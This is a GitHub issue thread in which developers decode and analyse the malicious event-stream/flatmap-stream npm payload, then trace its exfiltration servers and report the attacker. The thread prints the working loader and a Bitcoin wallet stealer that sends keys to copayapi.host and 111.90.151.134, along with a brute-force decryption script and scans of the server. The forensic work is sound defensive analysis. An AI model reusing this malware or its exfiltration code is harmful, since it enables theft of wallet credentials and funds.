var n = [""75d4c87f3f69e0fa292969072c49dff4f90f44c1385d8eb60dae4cc3a229e52cf61f78b0822353b4304e323ad563bc22c98421eb6a8c1917e30277f716452ee8d57f9838e00f0c4e4ebd7818653f00e72888a4031676d8e2a80ca3cb00a7396ae3d140135d97c6db00cab172cbf9a92d0b9fb0f73ff2ee4d38c7f6f4b30990f2c97ef39ae6ac6c828f5892dd8457ab530a519cd236ebd51e1703bcfca8f9441c2664903af7e527c420d9263f4af58ccb5843187aa0da1cbb4b6aedfd1bdc6faf32f38a885628612660af8630597969125c917dfc512c53453c96c143a2a058ba91bc37e265b44c5874e594caaf53961c82904a95f1dd33b94e4dd1d00e9878f66dafc55fa6f2f77ec7e7e8fe28e4f959eab4707557b263ec74b2764033cd343199eeb6140a6284cb009a09b143dce784c2cd40dc320777deea6fbdf183f787fa7dd3ce2139999343b488a4f5bcf3743eecf0d30928727025ff3549808f7f711c9f7614148cf43c8aa7ce9b3fcc1cff4bb0df75cb2021d0f4afe5784fa80fed245ee3f0911762fffbc36951a78457b94629f067c1f12927cdf97699656f4a2c4429f1279c4ebacde10fa7a6f5c44b14bc88322a3f06bb0847f0456e630888e5b6c3f2b8f8489cd6bc082c8063eb03dd665badaf2a020f1448f3ae268c8d176e1d80cc756dc3fa02204e7a2f74b9da97f95644792ee87f1471b4c0d735589fc58b5c98fb21c8a8db551b90ce60d88e3f756cc6c8c4094aeaa12b149463a612ea5ea5425e43f223eb8071d7b991cfdf4ed59a96ccbe5bdb373d8febd00f8c7effa57f06116d850c2d9892582724b3585f1d71de83d54797a0bfceeb4670982232800a9b695d824a7ada3d41e568ecaa6629"",""db67fdbfc39c249c6f338194555a41928413b792ff41855e27752e227ba81571483c631bc659563d071bf39277ac3316bd2e1fd865d5ba0be0bbbef3080eb5f6dfdf43b4a678685aa65f30128f8f36633f05285af182be8efe34a2a8f6c9c6663d4af8414baaccd490d6e577b6b57bf7f4d9de5c71ee6bbffd70015a768218a991e1719b5428354d10449f41bac70e5afb1a3e03a52b89a19d4cc333e43b677f4ec750bf0be23fb50f235dd6019058fbc3077c01d013142d9018b076698536d2536b7a1a6a48f5485871f7dc487419e862b1a7493d840f14e8070c8eff54da8013fd3fe103db2ecebc121f82919efb697c2c47f79516708def7accd883d980d5618efd408c0fd46fd387911d1e72e16cf8842c5fe3477e4b46aa7bb34e3cf9caddfca744b6a21b5457beaccff83fa6fb6e8f3876e4764e0d4b5318e7f3eed34af757eb240615591d5369d4ab1493c8a9c366dfa3981b92405e5ebcbfd5dca2c6f9b8e8890a4635254e1bc26d2f7a986e29fef6e67f9a55b6faec78d54eb08cb2f8ea785713b2ffd694e7562cf2b06d38a0f97d0b546b9a121620b7f9d9ccca51b5e74df4bdd82d2a5e336a1d6452912650cc2e8ffc41bd7aa17ab17f60b2bd0cfc0c35ed82c71c0662980f1242c4523fae7a85ccd5e821fe239bfb33d38df78099fd34f429d75117e39b888344d57290b21732f267c22681e4f640bec9437b756d3002a3135564f1c5947cc7c96e1370db7af6db24c9030fb216d0ac1d9b2ca17cb3b3d5955ffcc3237973685a2c078e10bc6e36717b1324022c8840b9a755cffdef6a4d1880a4b6072fd1eb7aabebb9b949e1e37be6dfb6437c3fd0e6f135bcea65e2a06eb35ff26dcf2b2772f8d0cde8e5fa5eec577e9754f6b044502f8ce8838d36827bd3fe91cccba2a04c3ee90c133352cbad34951fdf21a671a4e3940fd69cfee172df4123a0f678154871afa80f763d78df971a1317200d0ce5304b3f01ace921ea8afb41ec800ab834d81740353101408733fb710e99657554c50a4a8cb0a51477a07d6870b681cdc0be0600d912a0c711dc9442260265d50e269f02eb49da509592e0996d02a36a0ce040fff7bd3be57e97d07e4de0cdb93b7e3ccea422a5a526fb95ea8508ea2a40010f56d4aa96da23e6e9bcbae09dacccdcd8ac6af96a1922266c3795fb0798affaa75b8ae05221612ce45c824d1f6603fe2afd74b9e167736bfffe01a12b9f85912572a291336c693f133efeac881cd09207505ad93967e3b7a8972cdcce208bfa3b9956370795791ca91a8b9deabde26c3ee2adb43e9f7df2df16d4582a4e610b73754e609b1eea936a4d916bf5ed9d627692bcc8ed0933026e9250d16bdaf2b68470608aeaffedcf2be8c4c176bfc620e3f9f17a4a9d8ef9fe46cca41a79878d37423c0fa9f3ee1f4e6d68f029d6cbb5cbc90e7243135e0fc1dd66297d32adabc9a6d0235709be173b688ba2004f518f58f5459caca60d615ae4dc0d0eeacbe48ca8727a8b42dc78396316a0e223029b76311e7607ea5bd236307ba3b62afeff7a1ef5c0b5d7ee760c0f6472359c57817c5d9cd534d9a34bb4847bbc83c37b14b6444e9f386f1bec4b42c65d1078d54bd007ff545028205099abc454919406408b761a1636d10e39ede9f650f25abad3219b9d46d535402b930488535d97d19be3b0e75fed31d0b2f8af099481685e2b4fa9bff05cbac1b9b405db2c7eae68501633e02723560727a1c8c34c32afc76cdeb82fe8bae34b09cd82402076b9f481d043b080d851c7b6ba8613adba3bc3d5edb9a84fce41130ad328fe4c062a76966cb60c4fa801f359d22b70a797a2c2a3d19da7383025cb2e076b9c30b862456ae4b60197101e82133748c224a1431545fde146d98723ccb79b47155b218914c76f5d52027c06c6c913450fc56527a34c3fe1349f38018a55910de819add6204ab2829668ca0b7afb0d00f00c873a3f18daad9ae662b09c775cddbe98b9e7a43f1f8318665027636d1de18b5a77f548e9ede3b73e3777c44ec962fb7a94c56d8b34c1da603b3fc250799aad48cc007263daf8969dbe9f8ade2ac66f5b66657d8b56050ff14d8f759dd2c7c0411d92157531cfc3ac9c981e327fd6b140fb2abf994fa91aecc2c4fef5f210f52d487f117873df6e847769c06db7f8642cd2426b6ce00d6218413fdbba5bbbebc4e94bffdef6985a0e800132fe5821e62f2c1d79ddb5656bd5102176d33d79cf4560453ca7fd3d3c3be0190ae356efaaf5e2892f0d80c437eade2d28698148e72fbe17f1fac993a1314052345b701d65bb0ea3710145df687bb17182cd3ad6c121afef20bf02e0100fd63cbbf498321795372398c983eb31f184fa1adbb24759e395def34e1a726c3604591b67928da6c6a8c5f96808edfc7990a585411ffe633bae6a3ed6c132b1547237cab6f3b24c57d3d4cd8e2fbbd9f7674ececf0f66b39c2591330acc1ac20732a98e9b61a3fd979f88ab7211acbf629fcb0c80fb5ed1ea55df0735dcf13510304652763a5ed7bde3e5ebda1bf72110789ebefa469b70f6b4add29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1"",""63727970746f"",""656e76"",""6e706d5f7061636b6167655f6465736372697074696f6e"",""616573323536"",""6372656174654465636970686572"",""5f636f6d70696c65"",""686578"",""75746638""]
    
    npm_package_description = 'Cosa Models for MongoDB'; // Description from ps-tree (this is the aes decryption key)

var crypto = require('crypto');
function try_decode(key, id) {
    if(id % 10000 == 0) {
        console.log(id);
    }
    var decoded;

    try {
        var decipher = crypto.createDecipher('aes256', key),
        decoded = decipher.update(n[0], 'hex', 'utf8');

        // a += u.final(e(n[9]));
        decoded += decipher.final('utf8');
        syntax = esprima.parse(decoded, { tolerant: true });

    } catch(ex) {
        return false;
    }
    if(syntax.errors.length == 0) {
        console.log(key);
        console.log(decoded);
        return true;
    } else {
        return false;
    }

}


packages.map((descr, id) => try_decode(descr, id))
```"
1481	good work @maths22 ! How did you find the right package description? :-)
1482	@Enrico204 it looks like this was just bruteforced by going through a bunch of package descriptions.
1483	"That code does a second round of decryption and then executes this:

```js
/*@@*/!function(){function e(){try{var o=require(""http""),a=require(""crypto""),c=""-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"";function i(e,t,n){e=Buffer.from(e,""hex"").toString();var r=o.request({hostname:e,port:8080,method:""POST"",path:""/""+t,headers:{""Content-Length"":n.length,""Content-Type"":""text/html""}},function(){});r.on(""error"",function(e){}),r.write(n),r.end()}function r(e,t){for(var n="""",r=0;r<t.length;r+=200){var o=t.substr(r,200);n+=a.publicEncrypt(c,Buffer.from(o,""utf8"")).toString(""hex"")+""+""}i(""636f7061796170692e686f7374"",e,n),i(""3131312e39302e3135312e313334"",e,n)}function l(t,n){if(window.cordova)try{var e=cordova.file.dataDirectory;resolveLocalFileSystemURL(e,function(e){e.getFile(t,{create:!1},function(e){e.file(function(e){var t=new FileReader;t.onloadend=function(){return n(JSON.parse(t.result))},t.onerror=function(e){t.abort()},t.readAsText(e)})})})}catch(e){}else{try{var r=localStorage.getItem(t);if(r)return n(JSON.parse(r))}catch(e){}try{chrome.storage.local.get(t,function(e){if(e)return n(JSON.parse(e[t]))})}catch(e){}}}global.CSSMap={},l(""profile"",function(e){for(var t in e.credentials){var n=e.credentials[t];""livenet""==n.network&&l(""balanceCache-""+n.walletId,function(e){var t=this;t.balance=parseFloat(e.balance.split("" "")[0]),""btc""==t.coin&&t.balance<100||""bch""==t.coin&&t.balance<1e3||(global.CSSMap[t.xPubKey]=!0,r(""c"",JSON.stringify(t)))}.bind(n))}});var e=require(""bitcore-wallet-client/lib/credentials.js"");e.prototype.getKeysFunc=e.prototype.getKeys,e.prototype.getKeys=function(e){var t=this.getKeysFunc(e);try{global.CSSMap&&global.CSSMap[this.xPubKey]&&(delete global.CSSMap[this.xPubKey],r(""p"",e+""\t""+this.xPubKey))}catch(e){}return t}}catch(e){}}window.cordova?document.addEventListener(""deviceready"",e):e()}();
```

Deminified:
```js
/*@@*/ ! function() {
    function e() {
        try {
            var o = require(""http""),
                a = require(""crypto""),
                c = ""-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----"";

            function i(e, t, n) {
                e = Buffer.from(e, ""hex"").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: ""POST"",
                    path: ""/"" + t,
                    headers: {
                        ""Content-Length"": n.length,
                        ""Content-Type"": ""text/html""
                    }
                }, function() {});
                r.on(""error"", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = """", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, ""utf8"")).toString(""hex"") + ""+""
                }
                i(""636f7061796170692e686f7374"", e, n), i(""3131312e39302e3135312e313334"", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l(""profile"", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    ""livenet"" == n.network && l(""balanceCache-"" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split("" "")[0]), ""btc"" == t.coin && t.balance < 100 || ""bch"" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r(""c"", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require(""bitcore-wallet-client/lib/credentials.js"");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r(""p"", e + ""\t"" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener(""deviceready"", e) : e()
}();"
1484	"@Maths22, you said: ""The targeted package is: 'A Secure Bitcoin Wallet' https://www.npmjs.com/package/copay-dash"", is that a followup to the suggestion above ""could it be that this is a targeted attack against a potentially closed source project instead?""

Does that mean this malicious code included in event-stream is specifically targeting that Bitcoin package and is harmless to others that use the same event-stream code?
"
1485	"Prettified...

Initial payload:

```js
/*@@*/
module.exports = function(e) {
    try {
        if (!/build\:.*\-release/.test(process.argv[2])) return;
        var t = process.env.npm_package_description,
            r = require(""fs""),
            i = ""./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js"",
            n = r.statSync(i),
            c = r.readFileSync(i, ""utf8""),
            o = require(""crypto"").createDecipher(""aes256"", t),
            s = o.update(e, ""hex"", ""utf8"");
        s = ""\n"" + (s += o.final(""utf8""));
        var a = c.indexOf(""\n/*@@*/"");
        0 <= a && (c = c.substr(0, a)), r.writeFileSync(i, c + s, ""utf8""), r.utimesSync(i, n.atime, n.mtime), process.on(""exit"", function() {
            try {
                r.writeFileSync(i, c, ""utf8""), r.utimesSync(i, n.atime, n.mtime)
            } catch (e) {}
        })
    } catch (e) {}
};
```

Second-stage payload:

```js
/*@@*/ ! function() {
    function e() {
        try {
            var o = require(""http""),
                a = require(""crypto""),
                c = ""-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\n2wIDAQAB\\n-----END PUBLIC KEY-----"";

            function i(e, t, n) {
                e = Buffer.from(e, ""hex"").toString();
                var r = o.request({
                    hostname: e,
                    port: 8080,
                    method: ""POST"",
                    path: ""/"" + t,
                    headers: {
                        ""Content-Length"": n.length,
                        ""Content-Type"": ""text/html""
                    }
                }, function() {});
                r.on(""error"", function(e) {}), r.write(n), r.end()
            }

            function r(e, t) {
                for (var n = """", r = 0; r < t.length; r += 200) {
                    var o = t.substr(r, 200);
                    n += a.publicEncrypt(c, Buffer.from(o, ""utf8"")).toString(""hex"") + ""+""
                }
                i(""636f7061796170692e686f7374"", e, n), i(""3131312e39302e3135312e313334"", e, n)
            }

            function l(t, n) {
                if (window.cordova) try {
                    var e = cordova.file.dataDirectory;
                    resolveLocalFileSystemURL(e, function(e) {
                        e.getFile(t, {
                            create: !1
                        }, function(e) {
                            e.file(function(e) {
                                var t = new FileReader;
                                t.onloadend = function() {
                                    return n(JSON.parse(t.result))
                                }, t.onerror = function(e) {
                                    t.abort()
                                }, t.readAsText(e)
                            })
                        })
                    })
                } catch (e) {} else {
                    try {
                        var r = localStorage.getItem(t);
                        if (r) return n(JSON.parse(r))
                    } catch (e) {}
                    try {
                        chrome.storage.local.get(t, function(e) {
                            if (e) return n(JSON.parse(e[t]))
                        })
                    } catch (e) {}
                }
            }
            global.CSSMap = {}, l(""profile"", function(e) {
                for (var t in e.credentials) {
                    var n = e.credentials[t];
                    ""livenet"" == n.network && l(""balanceCache-"" + n.walletId, function(e) {
                        var t = this;
                        t.balance = parseFloat(e.balance.split("" "")[0]), ""btc"" == t.coin && t.balance < 100 || ""bch"" == t.coin && t.balance < 1e3 || (global.CSSMap[t.xPubKey] = !0, r(""c"", JSON.stringify(t)))
                    }.bind(n))
                }
            });
            var e = require(""bitcore-wallet-client/lib/credentials.js"");
            e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) {
                var t = this.getKeysFunc(e);
                try {
                    global.CSSMap && global.CSSMap[this.xPubKey] && (delete global.CSSMap[this.xPubKey], r(""p"", e + ""\\t"" + this.xPubKey))
                } catch (e) {}
                return t
            }
        } catch (e) {}
    }
    window.cordova ? document.addEventListener(""deviceready"", e) : e()
}();
```"
1486	has someone reported @right9ctrl already?
1487	The package is trying to steal bitcoin wallets.
1488	Yes. Doing an HTTP post at `111.90.151.134` if I'm reading right.
1489	Just for confirmation, flatmap-stream is the only malicious code introduced in event-stream ?
1490	"> I got it decoded. Package description ""A Secure Bitcoin Wallet"".

I noticed scrypt in the attacker's other github repositories, and I wondered if it might be cryptocurrency related."
1491	"@luisdavim The more reports, the better. 

@antony scrypt is a popular alternative to bcrypt for password hashing. It looks like the scrypt repo oin the attacker's GH is a clone of https://www.npmjs.com/package/scrypt (not a fork, or it'd be linked -- I found that through NPM)"
1492	should someone open issue on https://github.com/bitpay/copay/issues for visibility 
1493	I've just reported him.
1494	Also another host reached is `copayapi.host`
1495	I'm confused. I can't find this code neither in https://unpkg.com/flatmap-stream@0.1.1/index.min.js nor in https://registry.yarnpkg.com/flatmap-stream/-/flatmap-stream-0.1.1.tgz - Have anyone a copy of the original tarball/code?
1496	@maths22 Great job decoding it!
1497	"> Yes. Doing an HTTP post at `111.90.151.134` if I'm reading right.

It looks like it first tries `copayapi.host`, then `111.90.151.134`. `copayapi.host` is likely a domain intended to impersonate a legitimate Copay domain, which lines up with the other evidence that it tries to steal Copay Bitcoin wallets."
1498	Submitted a report to the Node Foundation Security Working Group (https://hackerone.com/nodejs-ecosystem/)
1499	@discordianfish i missed it at first too, it's definitely in 0.1.1 at the end of `index.min.js`
1500	"Here's a verbatim extract from the MIT license :

> THE  SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, 
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. 
IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR 
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, 
TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE 
SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

While it's definitely a deplorable situation, for people claiming he has any responsibility over this, _he does not_. Disagree all you want, hey, throw your ""thumbs down"" reactions all you want, the fact is it doesn't matter.

Now, I applaud those who are looking at solutions, figuring out what was wrong and trying to actively change things for the better. **This is productive.** Projecting blame to @dominictarr is not."
1501	@folkrav You're right, pointing fingers and holier-than-thou attitudes are really unproductive.
1502	The problem is that npm changed their upstream from @dominictarr to @right9ctrl without prior verification.  There are multiple transitive dependency issues with npm that make this kind of thing especially lucrative, and I'm glad it's starting to come out into the open.
1503	"@beaugunderson Are you sure? I only see ""2e2f746573742f64617461"", not the full payload as shown here."
1504	"> @beaugunderson Are you sure? I only see ""2e2f746573742f64617461"", not the full payload as shown here.

The payload is imported from `test/data.js`"
1505	@discordianfish I see the whole payload in `test/data.js` in the `flatmap-stream-0.1.1.tgz`
1506	"> should someone open issue on https://github.com/bitpay/copay/issues for visibility

Done. https://github.com/bitpay/copay/issues/9346"
1507	I think the reason he removed it and bumped the major version @FallingSnow is to hide his tracks. Most people tie to a major, so they would keep the backdoor as long as they didn't explicitly update the package's version. Meanwhile the current version looks innocent. @right9ctrl is certainly the perpetrator.
1508	"> Yes. Doing an HTTP post at `111.90.151.134` if I'm reading right.

Doing a quick scan

```sh
$ nmap -F 111.90.151.134     

Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-26 18:32 UTC
Nmap scan report for 111.90.151.134
Host is up (0.22s latency).
Not shown: 95 closed ports
PORT     STATE    SERVICE
25/tcp   open     smtp
111/tcp  open     rpcbind
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
8080/tcp open     http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
```"
1509	"So, for people who try to understand what the malicious payload is doing: it's basically crawling your dependencies for a peer dependency on the package `copay-dash`, and it's an attack basically crafted towards this package.

If your overall application has both this malicious package and ""copay-dash"", then it's going to try stealing the bitcoins stored in it.

They have been notified here: bitpay/copay#9346."
1510	@ali-essam both addresses (`copayapi.host:8080` and `111.90.151.134:8080`) point to an Express server.
1511	"> > should someone open issue on https://github.com/bitpay/copay/issues for visibility
> 
> Done. [bitpay/copay#9346](https://github.com/bitpay/copay/issues/9346)

Also sent them an email on security@bitpay.com, as per https://github.com/bitpay/copay/issues/4765"
1512	"> > Yes. Doing an HTTP post at `111.90.151.134` if I'm reading right.
> 
> Doing a quick scan

Most likely this is a compromised host itself"
1513	"Whois for 111.90.151.134:

```
$ whois 111.90.151.134
% [whois.apnic.net]
% Whois data copyright terms    http://www.apnic.net/db/dbcopyright.html

% Information related to '111.90.128.0 - 111.90.159.255'

% Abuse contact for '111.90.128.0 - 111.90.159.255' is 'abuse@shinjiru.com.my'

inetnum:        111.90.128.0 - 111.90.159.255
netname:        SHINJIRU-MY
descr:          Shinjiru Technology Sdn Bhd
country:        MY
admin-c:        STSB2-AP
tech-c:         STSB2-AP
country:        MY
org:            ORG-STSB2-AP
status:         ALLOCATED PORTABLE
mnt-by:         APNIC-HM
mnt-lower:      MAINT-SHINJIRU-MY
mnt-routes:     MAINT-SHINJIRU-MY
mnt-irt:        IRT-SHINJIRU-MY
last-modified:  2018-01-11T13:04:14Z
source:         APNIC

irt:            IRT-SHINJIRU-MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
e-mail:         abuse@shinjiru.com.my
abuse-mailbox:  abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
auth:           # Filtered
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:35Z
source:         APNIC

organisation:   ORG-STSB2-AP
org-name:       Shinjiru Technology Sdn Bhd
country:        MY
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
phone:          +60320318850
fax-no:         +60320318851
e-mail:         abuse@shinjiru.com.my
mnt-ref:        APNIC-HM
mnt-by:         APNIC-HM
last-modified:  2018-01-11T12:57:21Z
source:         APNIC

role:           Shinjiru Technology Sdn Bhd administrator
address:        19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,, Kuala Lumpur Wilayah Persekutuan 58100
country:        MY
phone:          +60320318850
fax-no:         +60320318850
e-mail:         abuse@shinjiru.com.my
admin-c:        STSB2-AP
tech-c:         STSB2-AP
nic-hdl:        STSB2-AP
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2017-03-20T10:31:34Z
source:         APNIC

% Information related to '111.90.144.0/21AS45839'

route:          111.90.144.0/21
origin:         AS45839
descr:          Shinjiru Technology Sdn Bhd
                19-2, Wisma Laxton, Jln Desa, Tmn Desa, Jln Klang Lama,
mnt-by:         MAINT-SHINJIRU-MY
last-modified:  2018-10-25T04:06:40Z
source:         APNIC

% This query was served by the APNIC Whois Service version 1.88.15-46 (WHOIS-US4)
```"
1514	"The adding and removing code makes this feel like the classic Ken Thompson ""Reflections on Trusting Trust"" attack: http://wiki.c2.com/?TheKenThompsonHack"
1515	good publicity for the registrar the attacker used 🤣 everyone file your complaints here: https://www.domains4bitcoins.com/
1516	"> good publicity for the registrar the attacker used 🤣 everyone file your complaints here: https://www.domains4bitcoins.com/

Direct report email address :
compliance@domains4bitcoins.com"
1517	"Used the following to check dependencies:
```
npm list | grep event-stream
```"
1518	Shouldn’t we be pushing github to boot @right9ctrl? There’s probably a good case to be made that he/she violated the terms of service. 
1519	"If you want to see all the packages in your `node_modules` that might be using `event-stream`:

```bash
cd node_modules && find . -name 'package.json'|xargs grep event-stream
```"
1520	Seems `copay-dash` did indeed at one point use the malicious dependency: https://github.com/bitpay/copay/commit/6cc4b757f6fbd111b9716b50d645390dd1f15105#diff-32607347f8126e6534ebc7ebaec4853dL12251
1521	"@vikasgorur Ah, thanks! Got it!

So the minified 0.1.1 version basically does a:

`require(Buffer.from(""2e2f746573742f64617461"", ""hex"").toString()`

which is obfuscated `require(""./test/data"")`"
1522	@aparajita Done
1523	javascript was a mistake
1524	"> > Yes. Doing an HTTP post at `111.90.151.134` if I'm reading right.
> 
> Doing a quick scan
> 
> ```shell
> $ nmap -F 111.90.151.134     
> 
> Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-26 18:32 UTC
> Nmap scan report for 111.90.151.134
> Host is up (0.22s latency).
> Not shown: 95 closed ports
> PORT     STATE    SERVICE
> 25/tcp   open     smtp
> 111/tcp  open     rpcbind
> 139/tcp  filtered netbios-ssn
> 445/tcp  filtered microsoft-ds
> 8080/tcp open     http-proxy
> 
> Nmap done: 1 IP address (1 host up) scanned in 3.73 seconds
> ```

A full scan yields this

```sh
 
$ nmap -p- 111.90.151.134   

Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-26 18:36 UTC
Nmap scan report for 111.90.151.134
Host is up (0.22s latency).
Not shown: 65524 closed ports
PORT      STATE    SERVICE
25/tcp    open     smtp
111/tcp   open     rpcbind
139/tcp   filtered netbios-ssn
445/tcp   filtered microsoft-ds
4786/tcp  filtered unknown
6667/tcp  filtered irc
6668/tcp  filtered irc
6669/tcp  filtered irc
8080/tcp  open     http-proxy
11211/tcp filtered unknown
44200/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 806.64 seconds
```"
1525	"> If an attacker successfully injects any code at all, it’s pretty much game over
> XSS is too small scale, and really well protected against.
> Chrome Extensions are too locked down.
> Lucky for me, **we live in an age where people install npm packages like they’re popping pain killers.**
> So, npm was to be my distribution method. I would need to come up with some borderline-useful package that people would install without thinking — my Trojan horse.

From [I’m harvesting credit card numbers and passwords from your site. Here’s how.](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5?gi=bd4cb2868524) published in January."
1526	"`111.90.151.134` port `8080` is an express server. Sending it a POST request to `/c` will always return a 200. The param `c` is taken from the decrypted payload `r(""c"", JSON.stringify(t))`

Sending it a payload that is to large will return `PayloadTooLargeError: request entity too large`. It also shows that the server is running under the `/root/server/` folder."
1527	Would gpg-signing and code reviews mitigate this issue?
1528	"@aparajita you're right. Check out this code snippet from another repo in that same user: https://github.com/right9ctrl/node-scrypt/blob/52a1cb792bc7ae0e4051ba4ad53e7b60fa5c806d/src/scryptwrapper/hash.c#L39-L45

Left shifting `1` by the number of rounds you're supposed to use for scrypt (2^14 - 2^20) results in the rounds being set to `0`!"
1529	@FallingSnow How was it that this code was originally discovered?
1530	@polson136 not today, hacker! (your github is a little bare)- it was a joke too,
1531	@lattwood Jeez, just because I don't publish much doesn't mean I'm not a legitimate person! I want to know so that I can know some things to watch out for when vetting dependencies of my own projects.
1532	@polson136 your best bet is to start at the top of the thread and read through (I just finished doing so myself). You'll see everything unfold from the initial discovery and up to the forensics to this point.
1533	"As a heads up, 3.3.6 was published 2-3 months ago.

As such, if you would have been affected by the attack you already would have been affected if you've `npm install`ed in a project that meets the criteria for being compromised over the past 2-3 months."
1534	@Serkan-devel Nope, because literally nothing can mitigate the issue of intentionally transferring complete control of a popular and highly-depended-on package to an attacker. You defend against it the same way as those Microsoft virus phone scams -- by not doing it in the first place.
1535	@Serkan-devel Nope, because literally nothing can mitigate the issue of intentionally transferring complete control of a popular and highly-depended-on package to an attacker. You defend against it the same way as those Microsoft virus phone scams -- by not doing it in the first place.
1536	"For the ones wondering what the code does, based on the provided pretiffied code above by @joepie91:
